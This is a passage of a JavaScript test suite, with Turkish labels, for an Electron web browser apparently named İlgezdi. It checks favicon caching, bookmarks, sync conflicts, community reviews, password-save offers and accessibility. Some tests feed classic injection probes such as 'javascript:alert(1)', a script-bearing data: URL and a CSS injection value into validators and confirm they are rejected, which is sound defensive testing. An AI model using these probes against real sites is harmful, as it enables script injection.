  const tp = read('main/threat-protection.js');
  check('durum değişince bildiriliyor (başlangıç, her liste, bitiş)', (tp.match(/notifyStatus\(\);/g) || []).length >= 3 && /onStatus: \(fn\) =>/.test(tp));
  check('süren güncelleme varken "Şimdi güncelle" onun bitmesini bekliyor', tp.includes('if (inFlight) return inFlight;'));
  check('ana süreç açık pencerelere durum gönderiyor', read('main/main.js').includes('threats.onStatus((st) =>') && read('main/main.js').includes("'threats-status-changed'"));
  check('önyükleme köprüsü ve Ayarlar aboneliği (bir kez)',
    read('preload/preload.js').includes("ipcRenderer.on('threats-status-changed'") && /let _threatStatusSubscribed = false;[\s\S]{0,200}if \(_threatStatusSubscribed\) return;/.test(read('renderer/settings-panel.js')));
}

suite('Yayın — v0.8.0');
{
  const ROOTD = path.join(__dirname, '..');
  check('paket sürümü 0.8.0', JSON.parse(fs.readFileSync(path.join(ROOTD, 'package.json'), 'utf8')).version === '0.8.0');
  const wf = fs.readFileSync(path.join(ROOTD, '.github', 'workflows', 'release.yml'), 'utf8');
  check('yayın otomatik güncelleme dosyalarını da yüklüyor (latest*.yml, blockmap)', wf.includes('dist/latest*.yml') && wf.includes('dist/*.blockmap'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Kullanıcı bildirimi (15 Eyl, v0.8.0): sekmede yükleme göstergesi yok, site
// simgeleri (favicon) sekmede ve yer imlerinde görünmüyor
// ══════════════════════════════════════════════════════════════════════════════
suite('Site simgeleri (favicon) ve sekme yükleme göstergesi');
{
  const fc = require('../src/main/favicon-cache.js');
  eq('alan adı anahtarı', [fc.hostKey('https://WWW.Ornek.com.tr/a?b'), fc.hostKey('http://a.b.c/'), fc.hostKey('file:///C:/x'), fc.hostKey('çöp')],
    ['ornek.com.tr', 'a.b.c', '', '']);
  const png = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
  const ico = Buffer.from('00000100010010100000', 'hex');
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>');
  const html = Buffer.from('<!doctype html><title>404</title>');
  eq('resim türü dosya imzasından (sunucunun beyanına güvenilmez)', [png, ico, svg, html].map(fc.sniffImageType), ['image/png', 'image/x-icon', 'image/svg+xml', '']);
  check('HTML hata sayfası ve 64 KB üstü simge reddediliyor',
    fc.toDataUrl(html) === '' && fc.toDataUrl(Buffer.concat([png, Buffer.alloc(fc.MAX_BYTES)])) === '' && fc.toDataUrl(png).startsWith('data:image/png;base64,'));
  eq('yalnızca data: resim adresleri kabul ediliyor',
    [fc.isImageDataUrl(fc.toDataUrl(png)), fc.isImageDataUrl('https://ornek.com/favicon.ico'), fc.isImageDataUrl('data:text/html;base64,PHNjcmlwdD4='), fc.isImageDataUrl('javascript:alert(1)')],
    [true, false, false, false]);
  eq('sayfanın simge adresleri: yalnızca http(s), png/ico önce, en fazla 3',
    fc.pickIconUrls(['data:image/png;base64,AA', 'https://a.com/x.svg', 'https://a.com/f.ico', 'javascript:1', 'http://a.com/b.png', 'https://a.com/c.gif']),
    ['https://a.com/f.ico', 'http://a.com/b.png', 'https://a.com/x.svg']);

  const cache = fc.createFaviconCache({ read: () => ({ 'ornek.com': fc.toDataUrl(png), 'kotu<>': 'data:text/html;base64,AA' }), write: () => {} });
  check('şifreli önbellekten yalnızca geçerli kayıtlar yükleniyor', cache.get('https://www.ornek.com/sayfa') !== '' && cache.size() === 1);
  cache.set('https://gizli.example/', fc.toDataUrl(ico), { incognito: true });
  check('gizli pencere simgesi yalnızca bellekte; normal önbelleğe ve diske gitmiyor',
    cache.get('https://gizli.example/', { incognito: true }) !== '' && cache.get('https://gizli.example/') === '' && cache.size() === 1);
  eq('yer imleri için toplu arama ağ isteği yapmıyor', Object.keys(cache.lookup(['https://ornek.com/a', 'https://yok.example/'])), ['ornek.com']);

  const mainJs = read('main/main.js');
  check('sekmenin yükleme durumu ve simgesi arayüze gidiyor',
    mainJs.includes("on('did-start-loading'") && mainJs.includes("on('did-stop-loading'") && mainJs.includes('loading: !!tab.loading') && mainJs.includes("favicon: tab.favicon || ''"));
  check('simge sekmenin oturumuyla indiriliyor; dış favicon servisi yok',
    mainJs.includes('faviconCache.update(view.webContents.session') && !/s2\/favicons|favicon\.yandex|icons\.duckduckgo/.test(mainJs + read('main/favicon-cache.js')));
  const appJs = read('renderer/app.js');
  check('sekmede dönen yükleme halkası, site simgesi ya da baş harf', appJs.includes("spin.className = 'tab-spinner'") && appJs.includes("el.setAttribute('aria-busy', 'true')") && appJs.includes('img.src = tab.favicon'));
  const css = read('renderer/styles/main.css');
  check('yükleme halkası temanın altın/bakır renklerinde ve "hareketi azalt" tercihine uyuyor',
    /\.tab-spinner::before \{[^}]*var\(--copper\)[^}]*var\(--gold\)/.test(css) && /prefers-reduced-motion: reduce\)[^}]*\{\s*\.tab-spinner::before/.test(css));
}

suite('Yer imi simgeleri, geçmişte HTTP işareti, Arku izinleri, durdur düğmesi');
{
  const { execFileSync } = require('child_process');
  let fav = {};
  try {
    fav = JSON.parse(execFileSync(process.execPath, [path.join(__dirname, 'helpers', 'favicon-import-check.js')], { encoding: 'utf8', timeout: 60000 }));
  } catch (e) { fav = { error: e.message }; }
  eq('içe aktarmada simge tarayıcının yerel önbelleğinden: yalnızca gerçek resim, eşleşen adres', fav.keys, ['https://a.example/', 'https://c.example/sayfa']);
  check('16 px tercih ediliyor, data:image/png dönüyor, geçici kopya siliniyor', fav.pngOk === true && fav.leftovers === 0, JSON.stringify(fav));

  const { SecureLogManager } = require('../src/main/secure-log-manager.js');
  const now = Date.UTC(2026, 8, 15, 12);
  const day = 86400000;
  const logs = [
    { url: 'http://kotu.example/a', domain: 'kotu.example', timestamp: now - day },
    { url: 'http://kotu.example/b', domain: 'kotu.example', timestamp: now - 2 * day },
    { url: 'http://eski.example/', domain: 'eski.example', timestamp: now - 9 * day },
    { url: 'https://iyi.example/', domain: 'iyi.example', timestamp: now - day },
    { url: 'http://192.168.1.1/', domain: '192.168.1.1', timestamp: now - day },
    { url: 'http://ikinci.example/', domain: 'ikinci.example', timestamp: now - 3 * day },
  ];
  const rep = SecureLogManager.prototype.httpReport.call({ logs }, { days: 7, now });
  eq('haftalık HTTP özeti: son 7 gün, yerel ağ sayılmıyor, alan adına göre sıralı',
    [rep.total, rep.http, rep.httpDomains, rep.top], [4, 3, 2, [{ domain: 'kotu.example', count: 2 }, { domain: 'ikinci.example', count: 1 }]]);

  const safety = require('../src/main/site-safety.js');
  const mainJs = read('main/main.js');
  check('panodan okuma (yapıştırma) sorularak veriliyor ve Site Bilgisi panelinde görünüyor',
    safety.SITE_PERMISSIONS.some((p) => p.id === 'clipboard-read' && p.ask) && /const ASK_USER\s*= new Set\(\[[^\]]*'clipboard-read'/.test(mainJs));
  check('klavye kilidi (tam ekranda sistem tuşları) sessizce izinli', /const QUIET_ALLOW = new Set\(\[[^\]]*'keyboardLock'/.test(mainJs));
  check('Esc yüklenen sayfayı durduruyor (odak sayfada: ana süreç, tuş sayfaya da gider; arayüzde: kapatılacak panel/ekran yoksa)',
    /surface === 'page' && input\.type === 'keyDown' && input\.key === 'Escape'[\s\S]{0,160}wc\.isLoading\(\)\) \{\s*wc\.stop\(\);\s*\}\s*const cmd/.test(mainJs)
    && /if \(!anyPanel && reloadIsStop\) sb\.stop\?\.\(\);/.test(read('renderer/app.js')));
  check('yenile düğmesi yükleme sırasında durdur oluyor',
    read('preload/preload.js').includes("ipcRenderer.invoke('stop-loading')") && mainJs.includes("ipcMain.handle('stop-loading'") && read('renderer/app.js').includes('reloadIsStop ? sb.stop?.() : sb.reload()'));
  const bmJs = read('renderer/bookmarks-panel.js');
  check('yer imi simgesi yalnızca data:image; eski uzak simge adresleri yüklenmiyor',
    bmJs.includes('if (/^data:image\\//.test(own)) return own;') && bmJs.includes('H.safeUrl(bmFaviconFor(item), { allowData: true })'));
  check('içe aktarmada gelen simge korunuyor, eksik simgeler tamamlanıyor',
    bmJs.includes('favicon: validIcon(it.favicon)') && bmJs.includes('cur.favicon = icon; iconsFilled++'));
  check('boş hazır klasörler (Genel, İş, Okuma) listede gizli', bmJs.includes("if (!count && ['default','work','reading'].includes(f.id) && bmCurrentFolder !== f.id) return '';"));
  const appJs = read('renderer/app.js');
  check('geçmişte HTTP ziyaretleri işaretli ve haftalık özet gösteriliyor',
    appJs.includes('lr-scheme http') && appJs.includes("renderHttpReport('history-http-report')") && mainJs.includes("ipcMain.handle('logs-http-report'"));
}

suite('Keşfet — TrendTech yazılımları');
{
  const df = require('../src/main/discover-feed.js');
  check('uygulamadaki liste geçerli ve yalnızca https', df.BUNDLED.length >= 3 && df.BUNDLED.every((b) => df.validateItem(b) && /^https:\/\//.test(b.url)));
  eq('sunucu kartı doğrulanıyor: http, kimlik bilgili adres, bozuk kimlik, renk enjeksiyonu, javascript: reddediliyor',
    [
      (df.validateItem({ id: 'ok', name: 'Ürün', url: 'https://ornek.com.tr', color: '#123abc' }) || {}).id,
      df.validateItem({ id: 'http', name: 'X', url: 'http://ornek.com' }),
      df.validateItem({ id: 'creds', name: 'X', url: 'https://kullanici:parola@ornek.com' }),
      df.validateItem({ id: 'Büyük Harf', name: 'X', url: 'https://ornek.com' }),
      (df.validateItem({ id: 'renk', name: 'X', url: 'https://ornek.com', color: 'red;background:url(x)' }) || {}).color,
      df.validateItem({ id: 'js', name: 'X', url: 'javascript:alert(1)' }),
    ],
    ['ok', null, null, null, '#5a6a8a', null]);
  eq('geçersiz akış uygulamadaki listeye düşüyor', [df.validateFeed({}), df.validateFeed({ items: [{ id: 'x' }] })], [null, null]);
  const siteFeed = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'site', 'discover.json'), 'utf8'));
  eq('sitedeki discover.json doğrulamadan geçiyor ve uygulamadaki listeyle aynı', (df.validateFeed(siteFeed) || []).map((i) => i.id), df.BUNDLED.map((b) => b.id));
  const appJs = read('renderer/app.js');
  const initDiscover = appJs.slice(appJs.indexOf('async function initDiscoverPage'), appJs.indexOf('const QUICK_LINKS = ['));
  check('Keşfet kartları textContent ile kuruluyor ve yeni sekmede açılıyor', initDiscover.length > 200 && !initDiscover.includes('innerHTML') && initDiscover.includes('sb.newTab(it.url)'));
  const feedJs = read('main/discover-feed.js');
  check('Keşfet akışı çerezsiz, bellek içi oturumla, günde en fazla bir kez', feedJs.includes("credentials: 'omit'") && feedJs.includes("FEED_PARTITION = 'ilgezdi-discover'") && feedJs.includes('REFRESH_MS = 24 * 3600 * 1000'));
  check('Keşfet: Marka CRM ve Tınga da listede', ['markacrm', 'tinga'].every((id) => df.BUNDLED.some((b) => b.id === id)));

  suite('Yer imleri paneli, ayar kaydı ve senkron çakışması (15 Eyl gece bildirimleri)');
  {
    const bmJs = read('renderer/bookmarks-panel.js');
    check('yer imleri paneline position verilmiyor (.side-panel sağa sabitler; 0.8.0\'da sayfanın altına düşüyordu)', !/#panel-bookmarks\s*\{[^}]*position/.test(bmJs));
    check('satırın tamamı tıklanıyor; tık → panel kapanıp aynı sekmede, Ctrl/orta tık → yeni sekmede',
      /function bmOpenUrl\(url, mode\)[\s\S]{0,300}newTab\?\.\(url, \{ background: mode === 'background' \}\)[\s\S]{0,160}ilgezdiCloseAllPanels\?\.\(\)[\s\S]{0,80}navigate\?\.\(url\)/.test(bmJs)
      && bmJs.includes("list?.addEventListener('auxclick'")
      && bmJs.includes('data-url="${H.esc(item.url)}" tabindex="0" role="link"'));
    check('senkron sonrası bellekteki yer imleri yeniden yükleniyor', /'ilgezdi-sync-applied', \(\) => \{\s*bmLoad\(\);/.test(bmJs));

    const spJs = read('renderer/settings-panel.js');
    const saveBlock = (spJs.match(/async function saveAllSettings\(\) \{[\s\S]*?showSettingsToast\('Ayarlar kaydedildi!'\)/) || [''])[0];
    check('Kaydet değerleri ekrandaki sekmeden okumuyor (başka sekmedeki kutu varsayılana düşmüyor)',
      saveBlock.length > 100 && !/getElementById\('cfg-[\w-]+'\)\?\.checked/.test(saveBlock) && saveBlock.includes('..._formCfg'));
    check('sekmeler bekleyen form değerleriyle çiziliyor; değişiklik dinleyicisi bir kez bağlanıyor',
      spJs.includes('renderSettingsTab(tabId, _formCfg)')
      && /_settingsEventsBound = true;\s*const content = document\.getElementById\('settings-content'\);\s*content\?\.addEventListener\('change', onSettingsFieldChange\)/.test(spJs));
    const fields = [...spJs.matchAll(/^\s*'([\w-]+)':\s*\['(\w+)', '(value|checked)'\]/gm)];
    const valuesFn = spJs.slice(spJs.indexOf('function formValuesFrom'), spJs.indexOf('function initFormState'));
    check('form alan listesi sekmelerdeki kimliklerle ve varsayılan değerlerle eşleşiyor',
      fields.length === 32
      && fields.every(([, id]) => spJs.includes(`id="${id}"`) || spJs.includes(`row('${id}'`))
      && fields.every(([, , key]) => new RegExp(`\\n\\s*${key}:\\s`).test(valuesFn)), fields.length);

    let sync = {};
    try {
      sync = JSON.parse(require('child_process').execFileSync(process.execPath, [path.join(__dirname, 'helpers', 'sync-conflict-check.js')], { encoding: 'utf8', timeout: 30000 }));
    } catch (e) { sync = { error: e.message }; }
    const L = sync.localNewer || {}, Rm = sync.remoteNewer || {};
    check('yerel değişiklik sunucudakinden yeniyse uzak ayar ve yer imleri uygulanmıyor, yerel gönderiliyor',
      L.saved === 0 && !L.applied && !L.bookmarksWritten && L.posts === 1 && L.postedHttpsOnly === true, JSON.stringify(sync));
    check('sunucudaki kayıt yeniyse uygulanıyor (başka cihazdaki değişiklik gelir)',
      Rm.saved === 1 && Rm.savedHttpsOnly === false && Rm.applied && Rm.posts === 0, JSON.stringify(sync));
    check('yerel zaman yoksa uzak uygulanıyor; sunucuda kayıt yoksa yerel gönderiliyor', sync.firstRun?.saved === 1 && sync.noRemote?.posts === 1);
    check('oturum kapalıyken yapılan değişiklik de zaman damgası bırakıyor', sync.offlineMarks === true);
    check('Geçmiş\'teki "Yalnızca HTTPS’i aç" düğmesi de senkrona değişiklik bildiriyor',
      /httpsOnly: true \}\);\s*window\.ilgezdiSync\?\.schedulePush\(\);/.test(read('renderer/app.js')));
  }

  suite('Topluluk — Keşfet yorumları ve Öneri (Qrtım doğrulaması, Nexus onayı)');
  {
    let api = {};
    try {
      api = JSON.parse(require('child_process').execFileSync(process.execPath, [path.join(__dirname, 'helpers', 'community-api-check.js')], { encoding: 'utf8', timeout: 30000 }));
    } catch (e) { api = { error: e.message }; }
    const brief = JSON.stringify(api).slice(0, 400);
    check('uygulama yorumu Qrtım hesabı olmadan reddediliyor (anahtarsız ve geçersiz anahtar → 401)', api.appNoToken?.status === 401 && api.appBadToken?.status === 401, brief);
    check('uygulama yorumu puansız kabul edilmiyor', api.appNoRating?.status === 400 && api.appNoRating.body.error === 'invalid_rating');
    check('hesaplı yorum "onay bekliyor" yazılıyor; HTML sökülüyor; kimlik ve e-posta yalnızca kayıtta',
      api.appFirst?.status === 201 && api.appDoc?.status === 'pending' && !/[<>]/.test(api.appDoc.comment) && api.appDoc.email === 'bir@example.com' && /^app_[0-9a-f]{24}$/.test(api.appDoc.id), JSON.stringify(api.appDoc));
    check('hesap başına tek yorum: düzenleme aynı kaydın yerine geçiyor, yayındaysa yeniden onaya düşüyor',
      api.appDocCount2 === 1 && api.appEdit?.body?.updated === true && api.appEdited?.status === 'pending' && api.appEdited.edited === true && api.appEdited.createdKept === true, JSON.stringify(api.appEdited));
    check('web sitesi formu değişmedi: anonim, onay bekliyor, IP başına saatte 3', api.sitePost?.status === 201 && api.siteDoc?.status === 'pending' && api.siteRate?.status === 429);
    check('herkese açık liste e-posta ve kimlik içermiyor; uygulama yorumu "Qrtım hesabı" işaretli',
      api.publicList?.status === 200 && !/@|userId|email/.test(JSON.stringify(api.publicList.body)) && api.publicList.body.items[0]?.verified === true && /s-maxage/.test(api.publicList.cache));
    check('oturumla kişi yalnızca kendi yorumunu ve durumunu görüyor; yanıt önbelleğe alınmıyor',
      api.mineList?.body?.mine?.status === 'approved' && api.otherMine?.body?.mine === null && api.mineList.cache === 'private, no-store');
    const fbDocs = api.fbDocs || [];
    check('öneri anonim gönderilebiliyor; anonimde e-posta ve iletişim izni saklanmıyor', api.fbAnon?.status === 201 && fbDocs[0]?.userId === null && fbDocs[0]?.email === '' && fbDocs[0]?.contactOk === false);
    check('tanılama yalnızca izinli alanlar (sürüm, Electron, işletim sistemi, mimari, dil); adres alanı atılıyor',
      JSON.stringify(fbDocs[0]?.diagKeys) === JSON.stringify(['appVersion', 'arch', 'electron', 'locale', 'os']));
    check('hesaplı öneride e-posta yalnızca "bana ulaşılabilir" işaretliyse saklanıyor', fbDocs[1]?.email === '' && fbDocs[2]?.email === 'bir@example.com' && fbDocs[2]?.contactOk === true);
    check('öneri doğrulaması: geçersiz tür, kısa başlık, geçersiz anahtar reddediliyor; bilinmeyen bölüm "genel"',
      api.fbBadType?.status === 400 && api.fbShort?.body?.error === 'invalid_title' && api.fbBadToken?.status === 401 && fbDocs[2]?.area === 'genel');
    check('anonim öneri IP başına saatte 3 ile sınırlı', api.fbRate?.status === 429);
    check('"Önerilerim" yalnızca oturumla ve yalnızca kişinin kendi kayıtları; Nexus durumu ve yanıtı geliyor',
      api.fbMineNoToken?.status === 401 && api.fbMine?.body?.items?.length === 2
      && api.fbMine.body.items.some((i) => i.status === 'planlandi' && /sürümde/.test(i.reply)) && api.fbMineOther?.body?.items?.length === 0);
    check('Qrtım doğrulaması Qrtım projesinin /auth/v1/user uç noktasına, anon anahtarla', api.verifyCalls?.allApikey === true && /kfpnsxoxfrxepxezatsr\.supabase\.co\/auth\/v1\/user$/.test(api.verifyCalls?.url || ''));

    const cm = require('../src/main/community.js');
    const tok = 'tok_' + 'a'.repeat(30);
    check('ana süreç doğrulaması: yorum için oturum anahtarı, puan, ad ve en az 10 karakter şart',
      cm.validateReview({ rating: 5, name: 'Ad', comment: 'yeterince uzun' }).error === 'unauthorized'
      && cm.validateReview({ token: tok, rating: 0, name: 'Ad', comment: 'yeterince uzun' }).error === 'invalid_rating'
      && cm.validateReview({ token: tok, rating: 5, name: 'A', comment: 'yeterince uzun' }).error === 'invalid_name'
      && cm.validateReview({ token: tok, rating: 5, name: 'Ad', comment: 'kısa' }).error === 'invalid_comment'
      && !!cm.validateReview({ token: tok, rating: 5, name: 'Ad', comment: 'yeterince uzun' }).value);
    const fv = cm.validateFeedback({ type: 'hata', area: 'yok', title: 'Başlık metni', message: 'Açıklama metni uzun', contactOk: true });
    check('ana süreç doğrulaması: öneride oturumsuz iletişim izni verilmiyor; tanılama yalnızca işaretlenince',
      fv.value && fv.value.contactOk === false && fv.value.area === 'genel' && fv.includeDiag === false);
    eq('öneri türleri ve bölümleri sunucuyla aynı', [cm.FEEDBACK_TYPES, cm.FEEDBACK_AREAS, cm.FEEDBACK_STATUSES],
      (() => { const f = read('../api/feedback.js'); const list = (name) => JSON.parse((f.match(new RegExp(`const ${name} = (\\[[\\s\\S]*?\\]);`)) || [, '[]'])[1].replace(/'/g, '"').replace(/,\s*\]/, ']')); return [list('TYPES'), list('AREAS'), list('STATUSES')]; })());
    const cmJs = read('main/community.js');
    check('topluluk istekleri yalnızca İlgezdi sunucusuna, bellek içi oturumla ve çerezsiz',
      cmJs.includes("API_BASE = 'https://www.ilgezdi.com.tr/api'") && cmJs.includes("PARTITION = 'ilgezdi-community'") && cmJs.includes("credentials: 'omit'"));
    check('sunucu adresi yalnızca paketlenmemiş geliştirme kopyasında değiştirilebiliyor', /apiBase: !app\.isPackaged \? process\.env\.ILGEZDI_API_BASE : undefined/.test(read('main/main.js')));
    const appSrc = read('renderer/app.js');
    const communityCode = appSrc.slice(appSrc.indexOf('// ─── Topluluk:'), appSrc.indexOf('const QUICK_LINKS'));
    check('yorum ve öneri arayüzü sunucu metnini innerHTML ile basmıyor', communityCode.length > 2000 && !communityCode.includes('innerHTML'));
    check('sol menüde Öneri düğmesi var ve sayfaya yönleniyor',
      /id="sb-feedback"[\s\S]{0,80}data-screen="feedback"/.test(read('renderer/index.html')) && appSrc.includes("showScreen('feedback', renderFeedbackPage).then(initFeedbackPage)"));
    check('yorum bölümü Keşfet sayfasında; oturum yoksa Qrtım girişine yönlendiriyor',
      appSrc.includes('initReviewSection();') && /review-login[\s\S]{0,120}ilgezdiAuth\?\.open\?\.\(\)/.test(appSrc));
    check('hesapla gönderilen öneride oturum yenilenemezse sessizce anonime düşülmüyor', /session && !token\s*\?\s*Promise\.resolve\(SESSION_LOST\)/.test(appSrc));
    check('preload topluluk köprüsü ve oturum anahtarı yenileme',
      read('preload/preload.js').includes("ipcRenderer.invoke('community-feedback-send', payload)") && read('renderer/auth-screen.js').includes('getAccessToken: async ({ refresh = false } = {})'));
  }

  suite('Şifre kaydetme önerisi ve doldurma');
  {
    const pwm = require('../src/main/password-manager.js');
    pwm._internals._setVaultForTest([
      { id: 'a', url: 'https://giris.example/', username: 'ayse', password: 'eski' },
      { id: 'b', url: 'https://giris.example/', username: 'mehmet', password: 'm1' },
    ]);
    eq('aynı hesap ve parola kayıtlı → öneri yok', pwm.classifyCapture('https://giris.example/login', 'ayse', 'eski'), { action: 'same' });
    eq('aynı hesap, yeni parola → güncelleme önerisi (www farkı önemsiz)', pwm.classifyCapture('https://www.giris.example/', 'ayse', 'yeni'), { action: 'update', id: 'a' });
    eq('yeni hesap → kaydetme önerisi', pwm.classifyCapture('https://giris.example/', 'zeynep', 'z1'), { action: 'new' });
    eq('https kaydı http sayfasında eşleşmiyor (ayrı kimlik)', pwm.classifyCapture('http://giris.example/', 'ayse', 'eski'), { action: 'new' });
    pwm._internals._setVaultForTest([]);

    const pre = read('preload/page-preload.js');
    check('sekme ön yüklemesi sayfaya hiçbir şey açmıyor (exposeInMainWorld yok)', !pre.includes('exposeInMainWorld') && !/window\.\w+\s*=/.test(pre));
    check('doldurma menüsü yalnızca gerçek kullanıcı etkileşimiyle (sayfa betiği focus() ile tetikleyemez)', /navigator\.userActivation \|\| !navigator\.userActivation\.isActive\) return;/.test(pre));
    check('parola değiştirme formları (farklı değerli birden çok parola) öneri doğurmuyor; kayıt formundaki şifre + tekrar kaydediliyor',
      pre.includes("if (filled.length > 2 || (filled.length === 2 && filled[0].value !== filled[1].value)) return;"));
    const mj = read('main/main.js');
    check('sayfa açılınca kendiliğinden doldurma kaldırıldı', !mj.includes('creds.length === 1 && creds[0].password') && !/executeJavaScript\(`\(function\(\)\{\s*try \{\s*var pw = document\.querySelector\('input\[type=password\]/.test(mj));
    check('sekmeler yalıtılmış şifre ön yüklemesiyle açılıyor', mj.includes("preload: path.join(__dirname, '../preload/page-preload.js')"));
    const cap = mj.slice(mj.indexOf("ipcMain.on('pw-capture'"), mj.indexOf("ipcMain.handle('pw-save-decision'"));
    check('kayıt önerisi: adres sekmeden okunuyor; gizli pencere, kapalı ayar ve "asla" listesi atlanıyor',
      cap.length > 500 && cap.includes('event.sender.getURL()') && cap.includes('ctx.incognito') && cap.includes('offerToSavePasswords === false') && cap.includes('passwordNeverSave'));
    const offerSend = (cap.match(/send\('pw-save-offer', \{[^}]*\}/) || [''])[0];
    check('arayüze giden öneride parola yok', offerSend.length > 20 && !/password/.test(offerSend), offerSend);
    const focusStart = mj.indexOf("ipcMain.on('pw-field-focus'");
    const focus = mj.slice(focusStart, focusStart + 2200);
    check('doldurma seçilince adres yeniden denetleniyor; yalnızca etkin sekmede menü', focusStart > 0 && focus.includes('webOrigin(wc.getURL()) !== origin') && focus.includes('activeTabId !== ctx.tabId'));
    check('karar yalnızca öneriyi alan pencereden; "asla" listesi arayüzün ayar kaydıyla değişmiyor',
      mj.includes('getContextFromEvent(event).state !== offer.state') && /MAIN_OWNED_KEYS = \[[^\]]*'passwordNeverSave'/.test(mj));
    const appSrc3 = read('renderer/app.js');
    const offerFn = appSrc3.slice(appSrc3.indexOf('function showPasswordOffer'), appSrc3.indexOf('async function decidePasswordOffer'));
    check('öneri şeridi metni textContent/append ile kuruluyor', offerFn.length > 300 && !offerFn.includes('innerHTML'));
    check('Ayarlar › Şifreler: öneri anahtarı form alanı; "asla" listesi ve Şifreleri yönet bağlantısı',
      read('renderer/settings-panel.js').includes('populatePwNeverList();') && appSrc3.includes("case 'passwords':        window.ilgezdiOpenSettings?.('passwords')"));
  }

  suite('Erişilebilirlik — varsayılan yakınlaştırma, en küçük yazı, hareket ve karşıtlık');
  {
    const bc2 = require('../src/main/browser-commands.js');
    eq('varsayılan yakınlaştırma yalnızca listedeki değerler', [bc2.normalizePageZoom('1.25'), bc2.normalizePageZoom(3), bc2.normalizePageZoom('x'), bc2.normalizePageZoom(0.8)], [1.25, 1, 1, 0.8]);
    eq('en küçük yazı boyutu yalnızca listedeki değerler', [bc2.normalizeMinFontSize('16'), bc2.normalizeMinFontSize(15), bc2.normalizeMinFontSize(null)], [16, 0, 0]);
    let zoomOut = null;
    const zs = bc2.createZoomStore({ read: () => ({ 'a.com': 1.5, 'b.com': 1 }), write: (o) => { zoomOut = o; }, delayMs: 5, defaultFactor: () => 1.25 });
    eq('kaydı olmayan site varsayılanı alır; varsayılan %125 iken kayıtlı %100 korunur',
      [zs.get('yeni.com'), zs.get('a.com'), zs.get('b.com'), zs.has('b.com'), zs.has('yeni.com')], [1.25, 1.5, 1, true, false]);
    zs.set('a.com', 1.25);
    zs.set('c.com', 1);
    zs.flush();
    eq('varsayılana eşit değer silinir, farklı olan (%100 dahil) yazılır', zoomOut, { 'b.com': 1, 'c.com': 1 });
    const mj2 = read('main/main.js');
    check('Ctrl+0 varsayılana döner; gösterge varsayılanı biliyor',
      mj2.includes('const factor = direction ? nextZoomFactor(wc.getZoomFactor(), direction) : defaultFactor;') && mj2.includes("send('zoom-changed', { factor, defaultFactor })"));
    check('yeni sekmelerde en küçük yazı boyutu; ayar değişince açık sekmelere varsayılan yakınlaştırma',
      mj2.includes('minimumFontSize: normalizeMinFontSize(config.minimumFontSize)') && mj2.includes('applyDefaultZoomToOpenTabs();') && mj2.includes("incoming.defaultPageZoom = normalizePageZoom(incoming.defaultPageZoom)"));
    const sp2 = read('renderer/settings-panel.js');
    check('hareketi azalt ve yüksek karşıtlık açılışta ve kaydedince uygulanıyor', (sp2.match(/applyAccessibility\((cfg|finalCfg)\);/g) || []).length === 2);
    const css2 = read('renderer/styles/main.css');
    check('hareketi azaltınca yükleme halkası durmuyor, yavaşlıyor',
      css2.includes(':root[data-reduce-motion] .tab-spinner::before { animation-duration: 2.6s !important; animation-iteration-count: infinite !important; }'));
    check('yüksek karşıtlık ayarla ve işletim sistemi tercihiyle', css2.includes(':root[data-contrast="high"] {') && css2.includes('@media (prefers-contrast: more)'));
    check('gösterge ve site bilgisi %100 yerine varsayılan orana göre', read('renderer/app.js').includes('zoomBtn.hidden = pct === def;') && read('renderer/app.js').includes('pct !== zoomDefaultPct'));
  }

  suite('Varsayılan tarayıcı — başka uygulamalardan gelen bağlantılar');
  {
    const bc3 = require('../src/main/browser-commands.js');
    eq('komut satırından yalnızca http(s) adresleri; bayrak, betik yolu, javascript: ve file: atılır',
      bc3.urlsFromArgv(['İlgezdi.exe', 'https://a.com/x?y=1', '--flag', 'javascript:alert(1)', 'file:///C:/x.html', 'http://b.com/']),
      ['https://a.com/x?y=1', 'http://b.com/']);
    eq('geliştirme komut satırı (electron .) adres içermiyor', bc3.urlsFromArgv(['electron.exe', '.', '--dev']), []);
    const mj3 = read('main/main.js');
    check('tek süreç: ikinci başlatma kapanıyor, bağlantı çalışan pencerede yeni sekmede açılıyor',
      mj3.includes('const isDuplicateInstance = !app.requestSingleInstanceLock();')
      && /app\.on\('second-instance', \(_event, argv\) => \{[\s\S]{0,400}openExternalUrls\(urls\)/.test(mj3)
      && mj3.includes('if (isDuplicateInstance) return;'));
    check('bağlantıyla açılışta ana sayfa yerine bağlantı; oturum geri yüklenince bağlantı da açılıyor',
      mj3.includes('if (openExternalUrls(external)) return;') && mj3.includes('if (saved && restoreSession(saved)) { openExternalUrls(external); return; }'));
    check('durum Windows kullanıcı seçiminden (UserChoice); Windows\'ta ayar sayfası açılıyor, kendini zorla varsayılan yapmıyor',
      mj3.includes('UrlAssociations\\\\https\\\\UserChoice') && mj3.includes('ms-settings:defaultapps?registeredAppUser=Ilgezdi'));
    const nsh = fs.readFileSync(path.join(__dirname, '..', 'build', 'installer.nsh'), 'utf8');
    check('kurulum İlgezdi\'yi tarayıcı olarak kaydediyor (http/https → IlgezdiURL, RegisteredApplications) ve kaldırınca siliyor',
      nsh.includes('URLAssociations" "http" "IlgezdiURL"') && nsh.includes('URLAssociations" "https" "IlgezdiURL"')
      && nsh.includes('WriteRegStr HKCU "Software\\RegisteredApplications" "Ilgezdi"')
      && nsh.includes('shell\\open\\command" "" \'"$INSTDIR\\${APP_EXECUTABLE_FILENAME}" "%1"\'')
      && nsh.includes('DeleteRegKey HKCU "Software\\Classes\\IlgezdiURL"'));
    check('kurulum betiği UTF-8 BOM\'lu (Türkçe adlar) ve electron-builder\'a bağlı',
      nsh.charCodeAt(0) === 0xFEFF && require('../package.json').build.nsis.include === 'build/installer.nsh');
  }

  suite('Orta tık ve Ctrl+tık — arka planda sekme');
  {
    const mj4 = read('main/main.js');
    check('new-tab arka plan seçeneğiyle etkin sekmeyi değiştirmiyor',
      /ipcMain\.handle\('new-tab', \(event, url, opts\) => \{[\s\S]{0,300}if \(!\(opts && opts\.background === true\)\) setActiveTab/.test(mj4));
    check('preload yalnızca background: true iletiyor',
      read('preload/preload.js').includes("newTab:    (url, opts) => ipcRenderer.invoke('new-tab', url, opts && opts.background === true ? { background: true } : undefined)"));
    const bm4 = read('renderer/bookmarks-panel.js');
    check('sık kullanılanlar çubuğu: orta tık ve Ctrl+tık arka planda, Ctrl+Shift/Shift+tık önde',
